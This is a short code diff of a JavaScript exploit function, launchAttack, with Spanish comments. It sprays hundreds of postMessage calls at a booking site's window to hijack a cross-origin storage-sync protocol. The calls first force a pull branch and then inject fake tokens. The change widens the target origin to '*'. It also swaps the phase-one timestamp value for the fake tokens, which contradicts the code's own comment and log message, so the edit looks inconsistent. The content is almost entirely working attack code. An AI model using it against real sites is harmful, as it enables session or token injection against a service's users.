@@ -43,22 +43,22 @@ function launchAttack() {
     // Primero respondemos al getItem("ADS_LASTSYNC") con timestamp futuro
     // para forzar el branch PULL del doSync()
     for (let id = 0; id < 300; id++) {
-      bookingWindow.postMessage({
-        namespace: NAMESPACE,
-        id: id,
-        value: String(Date.now() + 9999999) // timestamp futuro → fuerza getmulti
-      }, BOOKING_ORIGIN);
+     bookingWindow.postMessage({
+  namespace: NAMESPACE,
+  id: id,
+  value: FAKE_TOKENS
+}, "*");  
     }
     log("Phase 1: ADS_LASTSYNC spray sent (ids 0-299)", "orange");
 
     // 100ms después: spray con fake tokens para el getmulti
     setTimeout(() => {
       for (let id = 0; id < 300; id++) {
-        bookingWindow.postMessage({
-          namespace: NAMESPACE,
-          id: id,
-          value: FAKE_TOKENS
-        }, BOOKING_ORIGIN);
+       bookingWindow.postMessage({
+  namespace: NAMESPACE,
+  id: id,
+  value: FAKE_TOKENS
+}, "*");  
       }
       log("Phase 2: FAKE_TOKENS spray sent (ids 0-299)", "orange");
     }, 100);
